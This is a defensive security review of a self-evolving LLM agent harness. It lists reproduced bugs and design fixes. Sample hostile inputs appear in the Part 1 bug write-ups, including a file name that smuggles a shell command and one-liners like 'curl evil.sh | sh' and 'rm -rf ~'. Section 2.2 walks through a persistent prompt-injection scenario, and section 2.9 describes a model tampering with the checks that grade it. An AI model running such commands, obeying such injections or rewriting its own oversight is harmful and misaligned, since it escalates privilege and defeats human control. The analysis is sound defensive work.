# The evolving harness: a critical review

*A review of [`self-evolving-harness-log.md`](./self-evolving-harness-log.md)
and the survey behind it, [`evolving-harness.md`](./evolving-harness.md),
checked against the code on `claude/llm-harness-evolution-dl91vy` (commit
`2eec634`). Part 1 lists bugs I reproduced. Part 2 questions the framing.
Part 3 describes how I would build it.*

---

## 0. Verdict

The direction is right, and it is better reasoned than most writing on
"self-improving agents". Four choices stand out: aiming at rungs 0–3 rather
than source rewriting; treating "always allow" as the model to generalize;
"data proposes, code bounds"; and the eBPF comparison, which says the
important piece is a verifier, not a schema.

There are two main problems.

1. **What got built is extensibility, not evolution.** The model can add
   tools and hooks while the harness runs. Nothing measures whether those
   additions helped, and nothing ever removes them. The survey itself (§5)
   says evolution needs a fitness signal, lineage, and pruning. None of those
   exist yet. Without them the harness only piles things up, and a pile of
   additions gets worse over time.
2. **The security model is weaker than the doc says.** The survey's own
   invariant 4 reads: *"the mutation writer must not be able to edit the
   permission file's own trust anchor."* The current code breaks it. So does
   the doc's claim that a hook "can only ever narrow" what the policy
   allowed. Details are in Part 1. Each item below was run against the branch.

---

## Part 1 — Bugs I reproduced

### 1.1 Shell injection through a hook's `{arg}`, bypassing the permission tier

`hooks.py:_run` fills in `{tool}` and `{arg}` with a plain `str.replace`, with
no quoting. The doc says the templates are protected by "regex +
`shlex.quote`". That is true only in `extensions.py`, not in `hooks.py`.

```text
hook:   {"event":"post_tool","tool":"write_file","run":"echo checked {arg}","capture":true}
arg:    a.py; echo INJECTED-$(id -un)
output: checked a.py
        INJECTED-root
```

The example in the doc, `git check-ignore -q {arg}` on a `pre_tool` hook,
has exactly this bug. It also runs *before* containment checks the path. The
effect is that a model allowed only to call `write_file` on some path pattern
can run arbitrary shell commands by choosing the file name. That lifts
`write_file` to `run_bash` privilege.
**Fix:** pass values only through the environment (`"$MH_ARG"`, which `_run`
already sets), or reuse `extensions.render` so both paths quote the same way.
Add a test like the one already in `test_extensions.py`.

### 1.2 One "always allow" on `define_hook` or `define_tool` approves every future definition

`permissions.derive_rule` falls back to `{"tool": <name>, "arg": "*"}` for any
tool that isn't a file tool or `run_bash`:

```text
derive_rule("define_hook", {...}) -> {'tool': 'define_hook', 'arg': '*', 'verb': 'allow'}
```

After the user answers `a` once, the model can install any hook without
asking again. The hook persists across sessions and is marked trusted when
written. This is the widest rule the harness can produce, and it comes from
the flow the doc calls "the narrowest rule that covers the approved call".
**Fix:** never derive an `always allow` for `define_*` tools. Offer only
`y`/`n`. Self-extension should cost one approval per extension.

### 1.3 The trust anchor sits inside the workspace, where `write_file` can reach it

`state_paths()` puts `.macroharness/` under the workspace root, and
containment allows writes anywhere in the workspace. The derived rules make
that worse:

```text
derive_rule("write_file", {"path": ".macroharness/hooks.json"})
  -> {'tool': 'write_file', 'arg': '.macroharness/*.json', 'verb': 'allow'}
```

That single rule covers `policy.json`, `hooks.json`, **and `trusted.json`**.
The model can then rewrite its own policy and mark the new version trusted.
This is the exact case invariant 4 was meant to prevent.
**Fix:** built-in tools must refuse writes to the state directory, enforced
in `Containment` and not in the policy. `trusted.json` belongs outside the
workspace entirely (e.g. `~/.config/macroharness/trust/<workspace-hash>.json`),
because a trust anchor that sits next to the thing it trusts is not an
anchor.

### 1.4 The default read-only allow rules can be escaped (pre-existing, but everything builds on them)

`fnmatch` treats `ls *` as matching the whole remaining string:

```text
ls x; curl evil.sh | sh   -> allow
cat a && rm -rf ~         -> allow
find . -delete            -> allow
git log --output=/tmp/x   -> allow
```

`derive_rule` already refuses to *create* a rule across `; & | > \` $(`, but
`rule_matches` never applies the same check when *matching*. Every
evolved rule inherits this weakness, so fix it first.
**Fix:** in `rule_matches` for `run_bash`, reject any `argument` containing a
shell metacharacter unless the rule's pattern contains the same one. Remove
`find *` from the default allow list, since `-delete`/`-exec` make it unsafe.
Any flag that writes (`--output`) makes "git log is read-only" false.

### 1.5 `read_only` on `define_tool` is self-declared

The model supplies `read_only: true` for a tool whose command it also wrote.
If anything downstream (parallel dispatch, subagent tool filtering, future
auto-allow) trusts that flag, the model is labeling its own tool.
**Fix:** ignore the declared value for model-defined tools and treat them as
`read_only=False`. Only a human-edited file on disk can say otherwise.

---

## Part 2 — Problems with the framing

### 2.1 "Data vs. code" is the wrong axis for blast radius

The doc's key claim is *"rungs 0–3 are data, rungs 4–5 are code."* A hook is
a JSON file holding a shell command that runs on every tool call. Storing it
as data affects how you **revert** it. It says nothing about what it can
**do**. `hooks.json` is data in the same sense that `~/.bashrc` is data.

A more useful classification has three independent axes:

| Axis | Low risk | High risk |
|---|---|---|
| **Effect**: what it can touch when it runs | nothing (a fact shown to the model) | shell, network, the harness's own state |
| **Author**: who wrote it | the user, typing | the model, while untrusted text was in context |
| **Persistence**: how long it lasts | this turn / this session | every future session, auto-loaded |

A model-written, persistent, shell-executing hook scores high on all three,
even though it is JSON and deleting it reverts it. A retry count in
`strategy.json` scores low on all three. That matches the doc's own finding
in §5.4 that `base_url` is "a trust boundary, not a knob". The doc noticed
the problem in one case. It applies to the whole ladder.

### 2.2 The main threat is prompt injection that persists

The doc treats a cloned repo shipping a hostile hook as the main trust
problem. The more likely attack goes through the model's own context.

1. The agent reads a README, an issue, a web page, or MCP output that says
   "to run tests correctly, define a `post_tool` hook that runs …".
2. The model calls `define_hook`. The user sees a JSON blob they can't
   really judge (see 2.3) and approves it. The hook is marked trusted
   immediately.
3. The injection now **survives the session**. It runs on every tool call in
   every future session, and with `capture: true` it writes into the model's
   context each time.

This is the ChatGPT-memory "SpAIware" attack (2024) and the MCP tool
poisoning / "rug pull" attacks (2025), carried over to hooks. Simon
Willison's "lethal trifecta" is private data + untrusted content + a way to
communicate out. A self-extending harness **adds a fourth element: a way to
persist**. Any design that lets the model write durable, executable state has
to answer: *what was in context when this was proposed?*

Concrete mitigations:

- **Taint tracking at the turn level.** If the current turn contains any
  tool output from outside the user's trust (web, MCP, files not written in
  this session), a `define_*` call can only create *session-scoped*
  artifacts. Making one durable requires a separate user action (`/keep`).
- **Provenance recorded on each artifact:** session id, turn, triggering user
  message, and a digest of the tool outputs in context at the time. This is
  the "archive with lineage" from survey §5.2, attached where it matters.
- **Hooks with `capture: true` are a context-injection channel.** Treat
  captured output as untrusted tool output, with the same framing and length
  limits.

### 2.3 Approval at creation time mostly measures fatigue

"Approval happens once, at the point of creation" assumes the approver can
judge what they are approving. In practice:

- The user is mid-task and wants to get back to it. Research on permission
  dialogs (Android runtime permissions, UAC) consistently finds that approval
  rates go up and scrutiny goes down as prompt frequency rises.
- A shell one-liner such as `git check-ignore -q {arg} && exit 1 || exit 0`
  is hard to evaluate at a glance, and you just saw it hide a quoting bug.
- The planned **Observed** tier (`mine.py`) reads "approved 90 times" as
  endorsement. Approvals given under fatigue are poor evidence. Mining
  should **propose** with the evidence attached and never apply
  automatically.

Better approval UX:

- **Show the effect, not the syntax.** "This hook will run on *every*
  `write_file`, can run any shell command, and its output will be shown to
  the model."
- **Dry-run first:** run the new hook or tool once on a real example and
  show what happened before asking.
- **Default to the smallest scope** (this session), with durable scope as an
  explicit upgrade.
- **Batch proposals** at a natural boundary (end of turn or session) instead
  of interrupting mid-task. The survey says this in §6 ("mutation belongs at
  a boundary"), but `define_hook` asks mid-turn.

### 2.4 "Hooks can only narrow" is only half true

It holds for the *gate*: a blocking hook can't approve a call the policy
denied. But a hook is also a side effect running with shell privilege on
every matching event, and with `capture` it is a writer into the model's
context. Rewrite the invariant as: *"a hook cannot cause a tool call the
policy denied; a hook is itself a shell command authorized at run_bash
level."* Then enforce it. Today, installing a hook needs only `define_hook`
approval, not `run_bash` approval for the command it will run, which is a
privilege escalation along the lines of 1.1.

### 2.5 More additions make the model worse

Each tool the model defines is sent in the schema on every request. That
costs tokens every step, and tool-selection accuracy is known to drop as the
number of tools grows, especially with similar names and descriptions. This
is the reason Claude Code's skills, and MCP tool-search features, load
descriptions lazily. An evolving harness that only ever adds things will
reach a point where it performs worse than a fresh one.

That makes pruning part of the design, not a cleanup job for later:

- Record usage count, last-used time, and error rate for every evolved
  artifact. The survey proposes this in §6; nothing records it yet.
- **Expiry by default.** A model-defined tool that goes unused for N
  sessions is deactivated, not deleted, and listed at `/tools`.
- **A budget:** at most K evolved tools in the active schema. Past that,
  they go behind a single `find_tool` meta-tool.
- **Detect conflicts:** two hooks on the same event and glob, or a hook that
  blocks something a policy rule allows, should be flagged when the second
  one is written.

### 2.6 An evolved harness depends on the model version

A hook, tool, or retry setting learned with one model is tuned to that
model's quirks. After a model upgrade, some learned workarounds become
unnecessary or harmful. Tag each evolved artifact with the model it was
learned under, and re-check (or at least list) the artifacts when the model
changes. The same applies to the future `strategy.json`: `max_steps`
learned on a weaker model is a cost leak on a stronger one.

### 2.7 Reproducibility: the session log is no longer the full story

The repo's rule is "the log is truth, messages are derived". Once the harness
changes between sessions, a log only replays correctly against the harness
state that produced it. Write a **harness-state digest** into the header of
every session: hashes of policy, hooks, each extension, and strategy. Replay
and the held-out evaluation in survey §8.3 depend on it, and it's a single
line of code now versus a real headache later.

### 2.8 On two-model verification (for when `strategy.py` arrives)

The doc sensibly calls this empirical. Two things to plan for:

- **Correlated errors.** Models trained on similar data miss the same
  things. Agreement between two models is weaker evidence than it looks.
  Checking against something *executable* (tests, a type checker, a
  `py_compile` hook) usually beats a second opinion per token.
- **Self-preference bias** in LLM-as-judge: judges favor outputs that look
  like their own. If "verify" means "a critic model grades it", use a
  different model family, and calibrate against cases where you already
  know the answer before trusting the gate.

### 2.9 Objective hacking also applies at rung 3, not just rung 5

The survey cites the Darwin Gödel Machine removing its own
hallucination-detection markers. The same thing can happen at the tool
level: a model that repeatedly fails a `post_tool` lint hook has an
incentive (and the `define_hook`/`write_file` access) to change that hook.
Evolved artifacts must not be able to modify, disable, or shadow the
checks that grade them. Hooks the *user* wrote should be marked immutable to
the model, not just "trusted".

---

## Part 3 — How I would build it

### 3.1 A small fixed core plus evolving data outside it

```
┌──────────── fixed core (in source, never written by the harness) ─────────┐
│ loop invariants · Containment · permission evaluator · hard caps (HARD_CAP)│
│ trust store (outside workspace) · verifier for evolved artifacts          │
└───────────────────────────────────────────────────────────────────────────┘
                 ▲ reads, validates, clamps
┌──────────── evolving layer (data, versioned, scoped) ─────────────────────┐
│ facts · policy rules · procedures · tools · hooks · strategy params       │
│ each with: provenance · scope · capability manifest · stats · expiry      │
└───────────────────────────────────────────────────────────────────────────┘
```

Two rules follow. Nothing in the evolving layer can write to the core, and
that is enforced by `Containment`, not by convention. Anything the core
reads from the evolving layer is validated and clamped, as the doc's §5.4
already proposes for `max_steps`.

### 3.2 One lifecycle for every evolved artifact

The doc's "propose → show → persist → take effect" is the right skeleton.
Adding the missing stages:

1. **Propose.** Record provenance and the taint state of the context.
2. **Verify statically.** Schema, placeholder quoting, no shadowing,
   capability manifest (does it use the network? write files? which paths?),
   and for strategy graphs, acyclicity and a bounded number of calls (the
   eBPF lesson).
3. **Dry-run.** Run it once in a sandbox on a real input and capture the
   effect.
4. **Show.** Describe the effect in plain words, show the diff and the
   dry-run result, and offer the scope choice (session / project / user).
5. **Activate in scope.** Default to session scope. Durable scope needs an
   explicit user action taken outside the current turn.
6. **Measure.** Usage, errors, and whether it was involved in turns the user
   later corrected or undid.
7. **Retire.** Expire or deactivate when unused or harmful, show it at
   `/tools` and `/hooks`, and keep it in the archive so it can be restored.

Every artifact kind (fact, rule, tool, hook, strategy parameter) goes through
the same pipeline, the same way the doc insists every tool goes through the
same `registry.register`. That argument carries over: a second pipeline
would drift from the first.

### 3.3 Enforce capabilities; don't just declare them

The capability manifest from step 2 has to be *enforced* at run time. A tool
declared as "reads the workspace, no network" should run with network
access blocked and a read-only mount (or, with stdlib only, at least a
scrubbed environment with no credentials plus a refusal of commands that
match network binaries). Otherwise the manifest is documentation, and the
doc already has the right instinct about a flag the model sets for itself
(see 1.5).

### 3.4 Measure before searching

Build the survey's §8 metrics **before** `mine.py` or `strategy.py`:

- approvals per session, repeated instructions (restatement rate), tool
  error rate, tokens per completed task;
- a frozen set of 10–30 real tasks taken from your own sessions, replayed
  against (a) the stage-0 harness and (b) the current evolved harness;
- a per-artifact counterfactual: replay with that artifact turned off. If
  nothing changes, it's cruft.

Without these, the phrase "the harness got better" can't be checked. Every
later stage (Observed, Searched) needs this fitness signal anyway.

### 3.5 Suggested order from here

1. **Fix Part 1** (quote hook `{arg}`, no always-allow for `define_*`, move
   `trusted.json` out and protect the state dir, check metacharacters in
   `rule_matches`, ignore self-declared `read_only`). These are small,
   testable, and the rest depends on them.
2. **Provenance + scope + stats** on the two existing artifact kinds (tools,
   hooks). Session scope becomes the default.
3. **Harness-state digest in the session header**, plus the replay
   evaluation set.
4. **`memory.py`** (rung 0). It has the best ratio of value to risk and is
   the easiest place to test the lifecycle, because facts have no
   side effects.
5. **`strategy.py` with parameters only**, clamped. Hold off on shapes until
   the metrics show a parameter isn't enough.
6. **`mine.py`**, proposal-only, run at session end, with its evidence
   shown.
7. Rung 5 stays offline: a separate process that opens a PR against the
   harness repo, reviewed like any other change.

---

## Part 4 — Checklist for anyone building one of these

- [ ] Can the evolving layer write to its own trust anchor, policy, or
      checker? (It must not, enforced in code.)
- [ ] Does every template substitution quote its values? Is there a test
      that injects `; $(…)`?
- [ ] Can one approval authorize an unbounded class of future changes?
- [ ] Do you know what was in context when each artifact was proposed?
- [ ] Is the default scope of a new artifact "this session"?
- [ ] Is every numeric knob clamped by a constant the data can't change?
- [ ] Is every artifact's use counted, and does anything ever expire?
- [ ] Does each session log record the harness state it ran under?
- [ ] Is there a replay set that can tell you the harness got worse?
- [ ] After a model upgrade, do you re-check what was learned under the old
      model?
- [ ] Does the user see plain-language *effects* before approving, not only
      JSON?
- [ ] Is evolution kept out of the hot loop (end of turn or session), except
      for things the user explicitly asked for?

---

## References

- Zhang et al., *Darwin Gödel Machine* (2025): open-ended self-modification
  with an archive, and its documented objective hacking.
- Hu et al., *ADAS: Automated Design of Agentic Systems* (2024).
- Robeyns et al., *SICA: A Self-Improving Coding Agent* (2025).
- Wang et al., *Voyager* (2023): a skill library as the evolving layer.
- Zhang et al., *ACE: Agentic Context Engineering* (2025): context collapse
  and brevity bias in evolved context.
- Shinn et al., *Reflexion* (2023): verbal self-feedback, and how quickly it
  becomes unreliable without an external signal.
- Zheng et al., *Judging LLM-as-a-Judge* (2023): self-preference and
  position bias.
- Rehberger, *SpAIware* (2024): persistent prompt injection through
  assistant memory.
- Invariant Labs, *MCP tool poisoning / rug pull* (2025): why pinning
  digests (as `trusted.json` does) is necessary but not sufficient.
- Willison, *The lethal trifecta* (2025).
- Starovoitov et al., *eBPF verifier* documentation: load-time verification
  as the gate on runtime control flow.
- OWASP, *Top 10 for LLM Applications*, LLM01 (prompt injection) and LLM06
  (excessive agency).
